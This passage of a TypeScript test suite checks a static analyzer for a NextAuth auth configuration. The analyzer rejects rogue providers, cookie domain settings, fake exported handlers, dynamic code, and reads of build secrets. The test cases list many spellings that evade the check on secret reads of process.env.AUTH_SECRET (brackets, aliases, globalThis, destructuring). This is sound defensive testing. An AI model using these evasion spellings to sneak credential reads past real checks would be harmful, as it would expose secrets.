    expect(webDrift.web).not.toBe(webDrift.wire);
    expect(wireDrift.web).not.toBe(wireDrift.wire);
  });

  test.each([
    ["trailing identifier", "export const X = 60foo;"],
    ["legacy octal", "export const X = 060;"],
  ])("PLANTED: %s clock-skew source is rejected before literal inspection", (_label, source) => {
    expect(() => exportedNumericLiteral(source, "malformed-clock-skew.ts", "X")).toThrow(
      "contains TypeScript parse diagnostics",
    );
  });

  test("PLANTED: an ambient clock-skew declaration is not a runtime literal", () => {
    expect(() =>
      exportedNumericLiteral("export declare const X = 60;", "ambient-clock-skew.ts", "X"),
    ).toThrow("must not declare X");
  });

  test("PLANTED: a later named export cannot alias a second binding over the direct literal", () => {
    const source = "export const X = 60; const Y = 61; export { Y as X };";
    expect(() => exportedNumericLiteral(source, "aliased-clock-skew.ts", "X")).toThrow(
      "must export const X as one numeric literal",
    );
  });

  test("PLANTED: a namespace export cannot shadow the direct clock-skew literal", () => {
    const source = 'export const X = 60; export * as X from "./other";';
    expect(() => exportedNumericLiteral(source, "namespace-clock-skew.ts", "X")).toThrow(
      "must export const X as one numeric literal",
    );
  });

  test("PLANTED: an exported destructured binding cannot masquerade as the direct literal", () => {
    const source = "export const { X } = { X: 60 };";
    expect(() => exportedNumericLiteral(source, "destructured-clock-skew.ts", "X")).toThrow(
      "must export const X as one numeric literal",
    );
  });

  test.each([
    ["function", "export function X() {}"],
    ["class", "export class X {}"],
    ["enum", "export enum X { value }"],
    ["interface", "export interface X {}"],
    ["type", "export type X = number;"],
  ])("PLANTED: an exported %s cannot shadow the clock-skew literal", (_label, declaration) => {
    expect(() =>
      exportedNumericLiteral(
        `export const X = 60;\n${declaration}`,
        "duplicate-clock-skew.ts",
        "X",
      ),
    ).toThrow("must export const X as one numeric literal");
  });
});

describe("round 1 — the mutations that defeated the regexes", () => {
  test("an inline `domain` on an existing line is caught", () => {
    const hit = scan("inline-cookie-domain").find((v) => v.code === "AUTH_COOKIE_DOMAIN_SET");
    expect(hit).toBeDefined();
    expect(hit?.rule).toBe("ASI-HOST-ONLY");
    expect(hit?.fix_hint).toContain("WRONG_PRINCIPAL");
  });

  test("a second provider with a hyphenated package name is caught", () => {
    const codes = codesOf(scan("second-provider-hyphenated"));
    expect(codes).toContain("AUTH_PROVIDER_NOT_GOOGLE");
    // The import allowlist catches it a second, independent way.
    expect(codes).toContain("AUTH_IMPORT_NOT_ALLOWED");
  });

  test("a credential read via destructuring is caught", () => {
    const hits = scan("destructured-secret").filter((v) => v.code === "AUTH_ENV_ACCESS_FORBIDDEN");
    expect(hits.length).toBeGreaterThan(0);
    expect(hits[0]?.rule).toBe("ASI-NO-BUILD-SECRETS");
  });
});

describe("round 2 — the guard is the configured set, not the import list", () => {
  test("a locally-defined second provider is caught though no import names it", () => {
    const hit = scan("inline-custom-provider").find((v) => v.code === "AUTH_PROVIDER_UNRESOLVED");
    expect(hit).toBeDefined();
    expect(hit?.detail).toContain("Rogue");
  });

  test("importing Google without configuring it is caught", () => {
    expect(codesOf(scan("unused-google-import"))).toContain("AUTH_PROVIDER_MISSING");
  });

  test("a spread provider array is unprovable, and unprovable is a refusal", () => {
    expect(codesOf(scan("spread-providers"))).toContain("AUTH_PROVIDERS_UNRESOLVABLE");
  });

  test("a non-array providers value is a refusal", () => {
    expect(codesOf(validateAuthConfig(config({ providers: "buildProviders(Google)" })))).toContain(
      "AUTH_PROVIDERS_UNRESOLVABLE",
    );
  });
});

describe("round 3 — the verifier's bypasses", () => {
  test("the same provider twice is not a singleton", () => {
    const hit = scan("duplicate-google-provider").find(
      (v) => v.code === "AUTH_PROVIDERS_NOT_SINGLETON",
    );
    expect(hit).toBeDefined();
    expect(hit?.detail).toContain("2 entries");
    // Every entry resolves to Google, so the per-entry rules are all satisfied.
    expect(codesOf(scan("duplicate-google-provider"))).not.toContain("AUTH_PROVIDER_NOT_GOOGLE");
  });

  test("a clean first call cannot mask a second, exported one", () => {
    const codes = codesOf(scan("multiple-nextauth-calls"));
    expect(codes).toContain("AUTH_NEXTAUTH_CALL_AMBIGUOUS");
    // It refuses rather than reporting on whichever call it happened to find.
    expect(codes).not.toContain("AUTH_PROVIDER_MISSING");
  });

  test("a locally-defined function named NextAuth does not capture the guard", () => {
    expect(codesOf(scan("local-fake-nextauth"))).toContain("AUTH_NEXTAUTH_CALL_UNRESOLVED");
  });

  test("an IIFE runs at import and its secret read is caught", () => {
    const hit = scan("iife-env-read").find((v) => v.code === "AUTH_ENV_ACCESS_FORBIDDEN");
    expect(hit).toBeDefined();
    expect(hit?.detail).toContain("process");
  });

  test("static field initialisers and static blocks are caught", () => {
    expect(
      scan("static-class-env-read").filter((v) => v.code === "AUTH_ENV_ACCESS_FORBIDDEN"),
    ).toHaveLength(2);
  });

  test("a globalThis root assembled from string fragments is caught", () => {
    const hit = scan("computed-global-root").find((v) => v.code === "AUTH_ENV_ACCESS_FORBIDDEN");
    expect(hit).toBeDefined();
    expect(hit?.detail).toContain("globalThis");
  });

  test("the Bun global aliased before `.env` is caught", () => {
    expect(codesOf(scan("bun-alias"))).toContain("AUTH_ENV_ACCESS_FORBIDDEN");
  });

  test("an environment arriving from another module is caught by the import allowlist", () => {
    const hit = scan("disallowed-import").find((v) => v.code === "AUTH_IMPORT_NOT_ALLOWED");
    expect(hit).toBeDefined();
    expect(hit?.detail).toContain("./secrets");
  });
});

describe("round 4 — the contract must prove the shipped wiring", () => {
  test("a safe unused call cannot vouch for a fake exported factory", () => {
    const violations = scan("fake-exported-factory");
    const hit = violations.find((v) => v.code === "AUTH_EXPORT_NOT_WIRED");
    expect(hit).toBeDefined();
    expect(hit?.detail).toContain("did not come from the imported Auth.js call");
    expect(hit?.detail).toContain("handlers");
    // The impeccable unused call is present and must not launder the file.
    expect(formatAuthViolations(violations)).not.toBe("no violations");
  });

  test("a file that exports no handlers at all is refused", () => {
    const source = `
      import NextAuth from "next-auth";
      import Google from "next-auth/providers/google";
      const instance = NextAuth({
        providers: [Google],
        cookies: { sessionToken: { name: "s", options: { httpOnly: true } } },
      });
      export const auth = instance.auth;
    `;
    expect(codesOf(validateAuthConfig(source))).toContain("AUTH_EXPORT_NOT_WIRED");
  });

  test("a safe `handlers` cannot vouch for a fake `auth`, `signIn` or `signOut`", () => {
    const violations = scan("partial-fake-surface");
    const hit = violations.find((v) => v.code === "AUTH_EXPORT_NOT_WIRED");
    expect(hit).toBeDefined();
    expect(hit?.detail).toContain("auth");
    expect(hit?.detail).toContain("signIn");
    expect(hit?.detail).toContain("signOut");
    // handlers really is wired, and the checker says so rather than blaming it.
    expect(hit?.detail).not.toContain("handlers");

    const wiring = readAuthSurface(
      readFileSync(join(FIXTURES, "partial-fake-surface.ts"), "utf8"),
    ).wiring;
    expect(wiring.fromFactory).toEqual(["handlers"]);
    expect(wiring.foreign).toEqual(["auth", "signIn", "signOut"]);
  });

  test("re-exporting a fake through an export clause is still foreign", () => {
    const source = `
      import NextAuth from "next-auth";
      import Google from "next-auth/providers/google";
      const fake = { auth: () => undefined, signIn: () => undefined, signOut: () => undefined };
      export const { handlers } = NextAuth({
        providers: [Google],
        cookies: { sessionToken: { name: "s", options: { httpOnly: true } } },
      });
      const { auth, signIn, signOut } = fake;
      export { auth, signIn, signOut };
    `;
    expect(codesOf(validateAuthConfig(source))).toContain("AUTH_EXPORT_NOT_WIRED");
  });

  test("dynamic import is refused: the allowlist cannot see what it loads", () => {
    const hit = scan("dynamic-import-secrets").find(
      (v) => v.code === "AUTH_DYNAMIC_CODE_FORBIDDEN",
    );
    expect(hit).toBeDefined();
    expect(hit?.detail).toContain("./secrets");
  });

  test("require, eval and Function are all refused", () => {
    const hits = scan("require-and-eval").filter((v) => v.code === "AUTH_DYNAMIC_CODE_FORBIDDEN");
    const text = hits.map((v) => v.detail).join(" ");
    expect(text).toContain("require(");
    expect(text).toContain("eval(");
    expect(text).toContain("Function(");
  });

  test("Node's `global` is a fourth route to the environment and is refused", () => {
    const hit = scan("node-global-root").find((v) => v.code === "AUTH_ENV_ACCESS_FORBIDDEN");
    expect(hit).toBeDefined();
    expect(hit?.detail).toContain("global");
  });

  test("aliasing Function or eval before calling does not evade the check", () => {
    const hits = scan("aliased-dynamic-code").filter(
      (v) => v.code === "AUTH_DYNAMIC_CODE_FORBIDDEN",
    );
    const text = hits.map((v) => v.detail).join(" ");
    // The reference is the violation; the call site is `f(...)` and carries
    // nothing a syntax check could recognise.
    expect(text).toContain("Function");
    expect(text).toContain("eval");
  });

  test("a declaration named `require` is not itself a reference to require", () => {
    // `declare const require: …` names a binding; it does not invoke anything.
    const source = config({ extra: "declare const require: (id: string) => unknown;" });
    expect(codesOf(validateAuthConfig(source))).not.toContain("AUTH_DYNAMIC_CODE_FORBIDDEN");
  });

  test("the baseline exports the whole surface from the one factory call", () => {
    const wiring = readAuthSurface(readFileSync(join(FIXTURES, "valid.ts"), "utf8")).wiring;
    expect(wiring).toEqual({
      exported: ["handlers", "auth", "signIn", "signOut"],
      fromFactory: ["handlers", "auth", "signIn", "signOut"],
      missing: [],
      foreign: [],
    });
  });
});

describe("the environment rule is an allowlist over the whole file", () => {
  test.each([
    ["direct member", "const s = process.env.AUTH_SECRET;"],
    ["bracket on process", 'const s = process["env"].AUTH_SECRET;'],
    ["bracket on the key", 'const s = process.env["AUTH_SECRET"];'],
    ["Bun bracket", 'const s = Bun["env"]["AUTH_SECRET"];'],
    ["globalThis chain", "const s = globalThis.process.env.AUTH_SECRET;"],
    ["globalThis brackets", 'const s = globalThis["process"]["env"].AUTH_SECRET;'],
    ["alias of process", "const p = process;"],
    ["alias of Bun", "const b = Bun;"],
    ["alias of globalThis", "const g = globalThis;"],
    ["alias of the env object", "const e = process.env;"],
    ["computed key", "const s = process.env[k];"],
    ["destructure", "const { AUTH_SECRET } = process.env;"],
    ["renamed destructure", "const { AUTH_SECRET: s } = process.env;"],
    ["inside a callback", "const f = { cb: () => process.env.AUTH_SECRET };"],
    ["inside a nested function", "function outer() { function inner() { return Bun.env.X; } }"],
    ["passed as an argument", "register(process.env);"],
    [
      "NODE_ENV by bracket, which is not the allowed spelling",
      'const s = process.env["NODE_ENV"];',
    ],
  ])("%s is refused", (_label, extra) => {
    expect(codesOf(validateAuthConfig(config({ extra })))).toContain("AUTH_ENV_ACCESS_FORBIDDEN");
  });

  test("the one allowed spelling is accepted, and only in that exact shape", () => {
    const clean = config({
      options: '{ httpOnly: true, secure: process.env.NODE_ENV === "production" }',
    });
    expect(formatAuthViolations(validateAuthConfig(clean))).toBe("no violations");

    const accesses = readAuthSurface(clean).envAccesses;
    expect(accesses).toHaveLength(1);
    expect(accesses[0]?.allowed).toBe(true);
    expect(accesses[0]?.text).toBe("process.env.NODE_ENV");
  });

  test("a property merely named `process` is not an environment access", () => {
    expect(readAuthSurface("const o = { process: 1 }; const x = o.process;").envAccesses).toEqual(
      [],
    );
  });
});

describe("cookie spellings", () => {
  test.each([
    ["inline", '{ httpOnly: true, domain: ".asimposium.org" }'],
    ["own line", '{\n  httpOnly: true,\n  domain: ".asimposium.org",\n}'],
    ["quoted key", '{ httpOnly: true, "domain": ".asimposium.org" }'],
    ["trailing comment", '{ httpOnly: true, domain: ".x.org" /* temporary */ }'],
    ["odd whitespace", '{ httpOnly: true,   domain   :   ".x.org" }'],
  ])("`domain` written %s is caught", (_label, options) => {
    expect(codesOf(validateAuthConfig(config({ options })))).toContain("AUTH_COOKIE_DOMAIN_SET");
  });

  test("a spread on the cookie options is a refusal", () => {
    expect(codesOf(scan("spread-cookie-options"))).toContain("AUTH_COOKIE_UNRESOLVABLE");
  });

  test("omitting the cookie configuration is a refusal, not a silent default", () => {
    expect(codesOf(scan("no-cookie-config"))).toContain("AUTH_COOKIE_CONFIG_MISSING");
  });

  test("the word `domain` in a comment or a cookie name is not a violation", () => {
    const source = config({
      options: '{ httpOnly: true /* no domain here */, path: "/" }',
    }).replace('"asimp.session"', '"asimp.session.domain"');
    expect(codesOf(validateAuthConfig(source))).not.toContain("AUTH_COOKIE_DOMAIN_SET");
  });
});

describe("diagnostics", () => {
  test("no violation carries an absolute path", () => {
    for (const fixture of [
      "inline-cookie-domain",
      "second-provider-hyphenated",
      "destructured-secret",
      "inline-custom-provider",
      "duplicate-google-provider",
      "multiple-nextauth-calls",
      "local-fake-nextauth",
      "iife-env-read",
      "static-class-env-read",
      "computed-global-root",
      "bun-alias",
      "disallowed-import",
    ]) {
      const violations = scan(fixture);
      expect(violations.length).toBeGreaterThan(0);
      for (const v of violations) {
        expect(v.file.startsWith("/")).toBe(false);
        expect(v.file).not.toContain(FIXTURES);
      }
    }
  });

  test("a detail quotes the offending expression, never a resolved value", () => {
    // The analyzer reads source text only; there is no environment lookup in
    // it, so a planted value cannot reach a diagnostic even when the variable
    // it names is set in this very process. The quoted text is also kept to
    // the accessor rather than the whole statement, so it echoes as little of
    // the source as the message can carry and still be actionable.
    process.env.ASIMP_AUDIT_CANARY = "canary-secret-value";
    const violations = validateAuthConfig(
      config({ extra: "const { ASIMP_AUDIT_CANARY } = process.env;" }),
    );
    const detail = violations.map((v) => v.detail).join(" ");
    expect(codesOf(violations)).toContain("AUTH_ENV_ACCESS_FORBIDDEN");
    expect(detail).toContain("process.env");
    expect(detail).not.toContain("canary-secret-value");
  });
});
